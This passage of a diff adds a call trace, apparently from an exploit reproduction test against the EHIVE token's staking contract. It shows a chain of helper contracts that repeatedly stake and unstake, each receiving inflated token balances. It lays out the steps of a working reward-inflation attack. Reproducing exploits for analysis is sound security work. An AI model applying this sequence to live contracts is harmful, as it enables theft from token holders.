+    │   │   │   │   │   ├─ [88955] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::addLiquidityETH{value: 1892501341677648}(EHIVE: [0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd], 5208333333333333333333333 [5.208e24], 0, 0, 0x31e180e06D771dbAfa3D6Eea452195Ad1020fbDb, 1692606287 [1.692e9])
+    │   │   │   │   │   │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(EHIVE: [0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd], WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] EHIVE_WETH: [0xAE851769593AC6048D36BC123700649827659A82]
+    │   │   │   │   │   │   ├─ [504] EHIVE_WETH::getReserves() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 171279070234971304676280038442 [1.712e29], 34037670958878629264 [3.403e19], 1692606287 [1.692e9]
+    │   │   │   │   │   │   ├─ [8510] EHIVE::transferFrom(EHIVE: [0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd], EHIVE_WETH: [0xAE851769593AC6048D36BC123700649827659A82], 5208333333333333333333333 [5.208e24])
+    │   │   │   │   │   │   │   ├─ emit Approval(owner: EHIVE: [0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd], spender: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, value: 0)
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: EHIVE: [0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd], to: EHIVE_WETH: [0xAE851769593AC6048D36BC123700649827659A82], value: 5208333333333333333333333 [5.208e24])
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [21974] WETH::deposit{value: 1035033270562225}()
+    │   │   │   │   │   │   │   ├─ emit Deposit(dst: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, wad: 1035033270562225 [1.035e15])
+    │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   ├─ [3262] WETH::transfer(EHIVE_WETH: [0xAE851769593AC6048D36BC123700649827659A82], 1035033270562225 [1.035e15])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, to: EHIVE_WETH: [0xAE851769593AC6048D36BC123700649827659A82], value: 1035033270562225 [1.035e15])
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [29939] EHIVE_WETH::mint(0x31e180e06D771dbAfa3D6Eea452195Ad1020fbDb)
+    │   │   │   │   │   │   │   ├─ [996] EHIVE::balanceOf(EHIVE_WETH: [0xAE851769593AC6048D36BC123700649827659A82]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 171284278568304638009613371775 [1.712e29]
+    │   │   │   │   │   │   │   ├─ [534] WETH::balanceOf(EHIVE_WETH: [0xAE851769593AC6048D36BC123700649827659A82]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 34038705992149191489 [3.403e19]
+    │   │   │   │   │   │   │   ├─ [2314] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::feeTo() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x31e180e06D771dbAfa3D6Eea452195Ad1020fbDb, value: 63883291995105767429 [6.388e19])
+    │   │   │   │   │   │   │   ├─ emit Sync(reserve0: 171284278568304638009613371775 [1.712e29], reserve1: 34038705992149191489 [3.403e19])
+    │   │   │   │   │   │   │   ├─ emit Mint(sender: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, amount0: 5208333333333333333333333 [5.208e24], amount1: 1035033270562225 [1.035e15])
+    │   │   │   │   │   │   │   └─ ← [Return] 63883291995105767429 [6.388e19]
+    │   │   │   │   │   │   ├─ [55] EHIVE::fallback{value: 857468071115423}()
+    │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   └─ ← [Return] 5208333333333333333333333 [5.208e24], 1035033270562225 [1.035e15], 63883291995105767429 [6.388e19]
+    │   │   │   │   │   ├─ emit Transfer(from: EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: UnstakeContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 179972372270286590599676856079 [1.799e29])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [226361] UnstakeContract::unstake(UnstakeContract: [0x2e234DAe75C793f67A35089C9d99245E1C58470b])
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 179972372270286590599676856079 [1.799e29]
+    │   │   │   │   │   ├─ [60914] EHIVE::stake(179972372270286590599676856079 [1.799e29], 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x0000000000000000000000000000000000000000, value: 179972372270286590599676856079 [1.799e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [125873] EHIVE::unstake(0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UnstakeContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 189340797128191919973357009679 [1.893e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 189340797128191919973357009679 [1.893e29]
+    │   │   │   │   │   ├─ [35377] EHIVE::transfer(UnstakeContract: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 189340797128191919973357009679 [1.893e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: UnstakeContract: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], value: 189340797128191919973357009679 [1.893e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [216761] UnstakeContract::unstake(UnstakeContract: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a])
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 189340797128191919973357009679 [1.893e29]
+    │   │   │   │   │   ├─ [56114] EHIVE::stake(189340797128191919973357009679 [1.893e29], 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], to: 0x0000000000000000000000000000000000000000, value: 189340797128191919973357009679 [1.893e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [121073] EHIVE::unstake(0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UnstakeContract: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], value: 199196893417056704848681579279 [1.991e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 199196893417056704848681579279 [1.991e29]
+    │   │   │   │   │   ├─ [35377] EHIVE::transfer(UnstakeContract: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 199196893417056704848681579279 [1.991e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], to: UnstakeContract: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], value: 199196893417056704848681579279 [1.991e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [216761] UnstakeContract::unstake(UnstakeContract: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9])
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 199196893417056704848681579279 [1.991e29]
+    │   │   │   │   │   ├─ [56114] EHIVE::stake(199196893417056704848681579279 [1.991e29], 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], to: 0x0000000000000000000000000000000000000000, value: 199196893417056704848681579279 [1.991e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [121073] EHIVE::unstake(0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UnstakeContract: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], value: 209566046773013081265460977679 [2.095e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 209566046773013081265460977679 [2.095e29]
+    │   │   │   │   │   ├─ [35377] EHIVE::transfer(UnstakeContract: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 209566046773013081265460977679 [2.095e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], to: UnstakeContract: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], value: 209566046773013081265460977679 [2.095e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [216761] UnstakeContract::unstake(UnstakeContract: [0xc7183455a4C133Ae270771860664b6B7ec320bB1])
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 209566046773013081265460977679 [2.095e29]
+    │   │   │   │   │   ├─ [56114] EHIVE::stake(209566046773013081265460977679 [2.095e29], 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], to: 0x0000000000000000000000000000000000000000, value: 209566046773013081265460977679 [2.095e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [121073] EHIVE::unstake(0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UnstakeContract: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], value: 220474964276265817002566481679 [2.204e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 220474964276265817002566481679 [2.204e29]
+    │   │   │   │   │   ├─ [35377] EHIVE::transfer(UnstakeContract: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], 220474964276265817002566481679 [2.204e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], to: UnstakeContract: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], value: 220474964276265817002566481679 [2.204e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [216761] UnstakeContract::unstake(UnstakeContract: [0xa0Cb889707d426A7A386870A03bc70d1b0697598])
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0xc7183455a4C133Ae270771860664b6B7ec320bB1]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 220474964276265817002566481679 [2.204e29]
+    │   │   │   │   │   ├─ [56114] EHIVE::stake(220474964276265817002566481679 [2.204e29], 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], to: 0x0000000000000000000000000000000000000000, value: 220474964276265817002566481679 [2.204e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [121073] EHIVE::unstake(0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UnstakeContract: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], value: 231951743238591982819136222479 [2.319e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0xc7183455a4C133Ae270771860664b6B7ec320bB1]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 231951743238591982819136222479 [2.319e29]
+    │   │   │   │   │   ├─ [35377] EHIVE::transfer(UnstakeContract: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], 231951743238591982819136222479 [2.319e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], to: UnstakeContract: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], value: 231951743238591982819136222479 [2.319e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [216761] UnstakeContract::unstake(UnstakeContract: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211])
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0xa0Cb889707d426A7A386870A03bc70d1b0697598]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 231951743238591982819136222479 [2.319e29]
+    │   │   │   │   │   ├─ [56114] EHIVE::stake(231951743238591982819136222479 [2.319e29], 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], to: 0x0000000000000000000000000000000000000000, value: 231951743238591982819136222479 [2.319e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [121073] EHIVE::unstake(0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UnstakeContract: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], value: 244025943571559784664515403279 [2.44e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0xa0Cb889707d426A7A386870A03bc70d1b0697598]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 244025943571559784664515403279 [2.44e29]
+    │   │   │   │   │   ├─ [35377] EHIVE::transfer(UnstakeContract: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], 244025943571559784664515403279 [2.44e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0xa0Cb889707d426A7A386870A03bc70d1b0697598], to: UnstakeContract: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], value: 244025943571559784664515403279 [2.44e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [216761] UnstakeContract::unstake(UnstakeContract: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c])
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 244025943571559784664515403279 [2.44e29]
+    │   │   │   │   │   ├─ [56114] EHIVE::stake(244025943571559784664515403279 [2.44e29], 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], to: 0x0000000000000000000000000000000000000000, value: 244025943571559784664515403279 [2.44e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [121073] EHIVE::unstake(0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UnstakeContract: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], value: 256728663921860157016913188879 [2.567e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 256728663921860157016913188879 [2.567e29]
+    │   │   │   │   │   ├─ [35377] EHIVE::transfer(UnstakeContract: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c], 256728663921860157016913188879 [2.567e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], to: UnstakeContract: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c], value: 256728663921860157016913188879 [2.567e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [216761] UnstakeContract::unstake(UnstakeContract: [0x03A6a84cD762D9707A21605b548aaaB891562aAb])
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 256728663921860157016913188879 [2.567e29]
+    │   │   │   │   │   ├─ [56114] EHIVE::stake(256728663921860157016913188879 [2.567e29], 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c], to: 0x0000000000000000000000000000000000000000, value: 256728663921860157016913188879 [2.567e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [121073] EHIVE::unstake(0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UnstakeContract: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c], value: 270092621769847398067107230479 [2.7e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 270092621769847398067107230479 [2.7e29]
+    │   │   │   │   │   ├─ [35377] EHIVE::transfer(UnstakeContract: [0x03A6a84cD762D9707A21605b548aaaB891562aAb], 270092621769847398067107230479 [2.7e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0xA4AD4f68d0b91CFD19687c881e50f3A00242828c], to: UnstakeContract: [0x03A6a84cD762D9707A21605b548aaaB891562aAb], value: 270092621769847398067107230479 [2.7e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [216761] UnstakeContract::unstake(UnstakeContract: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF])
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x03A6a84cD762D9707A21605b548aaaB891562aAb]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 270092621769847398067107230479 [2.7e29]
+    │   │   │   │   │   ├─ [56114] EHIVE::stake(270092621769847398067107230479 [2.7e29], 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x03A6a84cD762D9707A21605b548aaaB891562aAb], to: 0x0000000000000000000000000000000000000000, value: 270092621769847398067107230479 [2.7e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [121073] EHIVE::unstake(0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UnstakeContract: [0x03A6a84cD762D9707A21605b548aaaB891562aAb], value: 284152237697592879062379038479 [2.841e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x03A6a84cD762D9707A21605b548aaaB891562aAb]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 284152237697592879062379038479 [2.841e29]
+    │   │   │   │   │   ├─ [35377] EHIVE::transfer(UnstakeContract: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], 284152237697592879062379038479 [2.841e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x03A6a84cD762D9707A21605b548aaaB891562aAb], to: UnstakeContract: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], value: 284152237697592879062379038479 [2.841e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [216761] UnstakeContract::unstake(UnstakeContract: [0x15cF58144EF33af1e14b5208015d11F9143E27b9])
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 284152237697592879062379038479 [2.841e29]
+    │   │   │   │   │   ├─ [56114] EHIVE::stake(284152237697592879062379038479 [2.841e29], 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], to: 0x0000000000000000000000000000000000000000, value: 284152237697592879062379038479 [2.841e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [121073] EHIVE::unstake(0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UnstakeContract: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], value: 298943724043494974136855921679 [2.989e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 298943724043494974136855921679 [2.989e29]
+    │   │   │   │   │   ├─ [35377] EHIVE::transfer(UnstakeContract: [0x15cF58144EF33af1e14b5208015d11F9143E27b9], 298943724043494974136855921679 [2.989e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF], to: UnstakeContract: [0x15cF58144EF33af1e14b5208015d11F9143E27b9], value: 298943724043494974136855921679 [2.989e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [216761] UnstakeContract::unstake(UnstakeContract: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C])
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x15cF58144EF33af1e14b5208015d11F9143E27b9]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 298943724043494974136855921679 [2.989e29]
+    │   │   │   │   │   ├─ [56114] EHIVE::stake(298943724043494974136855921679 [2.989e29], 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x15cF58144EF33af1e14b5208015d11F9143E27b9], to: 0x0000000000000000000000000000000000000000, value: 298943724043494974136855921679 [2.989e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [121073] EHIVE::unstake(0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UnstakeContract: [0x15cF58144EF33af1e14b5208015d11F9143E27b9], value: 314505178171786493338500062479 [3.145e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x15cF58144EF33af1e14b5208015d11F9143E27b9]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 314505178171786493338500062479 [3.145e29]
+    │   │   │   │   │   ├─ [35377] EHIVE::transfer(UnstakeContract: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C], 314505178171786493338500062479 [3.145e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x15cF58144EF33af1e14b5208015d11F9143E27b9], to: UnstakeContract: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C], value: 314505178171786493338500062479 [3.145e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [216761] UnstakeContract::unstake(UnstakeContract: [0x2a07706473244BC757E10F2a9E86fB532828afe3])
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 314505178171786493338500062479 [3.145e29]
+    │   │   │   │   │   ├─ [56114] EHIVE::stake(314505178171786493338500062479 [3.145e29], 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C], to: 0x0000000000000000000000000000000000000000, value: 314505178171786493338500062479 [3.145e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [121073] EHIVE::unstake(0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UnstakeContract: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C], value: 330876680597167160115022411279 [3.308e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 330876680597167160115022411279 [3.308e29]
+    │   │   │   │   │   ├─ [35377] EHIVE::transfer(UnstakeContract: [0x2a07706473244BC757E10F2a9E86fB532828afe3], 330876680597167160115022411279 [3.308e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C], to: UnstakeContract: [0x2a07706473244BC757E10F2a9E86fB532828afe3], value: 330876680597167160115022411279 [3.308e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [216761] UnstakeContract::unstake(UnstakeContract: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7])
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x2a07706473244BC757E10F2a9E86fB532828afe3]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 330876680597167160115022411279 [3.308e29]
+    │   │   │   │   │   ├─ [56114] EHIVE::stake(330876680597167160115022411279 [3.308e29], 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x2a07706473244BC757E10F2a9E86fB532828afe3], to: 0x0000000000000000000000000000000000000000, value: 330876680597167160115022411279 [3.308e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [121073] EHIVE::unstake(0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UnstakeContract: [0x2a07706473244BC757E10F2a9E86fB532828afe3], value: 348100398217293669819639134479 [3.481e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x2a07706473244BC757E10F2a9E86fB532828afe3]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 348100398217293669819639134479 [3.481e29]
+    │   │   │   │   │   ├─ [35377] EHIVE::transfer(UnstakeContract: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7], 348100398217293669819639134479 [3.481e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x2a07706473244BC757E10F2a9E86fB532828afe3], to: UnstakeContract: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7], value: 348100398217293669819639134479 [3.481e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [216761] UnstakeContract::unstake(UnstakeContract: [0xD16d567549A2a2a2005aEACf7fB193851603dd70])
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 348100398217293669819639134479 [3.481e29]
+    │   │   │   │   │   ├─ [56114] EHIVE::stake(348100398217293669819639134479 [3.481e29], 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7], to: 0x0000000000000000000000000000000000000000, value: 348100398217293669819639134479 [3.481e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [121073] EHIVE::unstake(0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UnstakeContract: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7], value: 366220692919015806056825496079 [3.662e29])
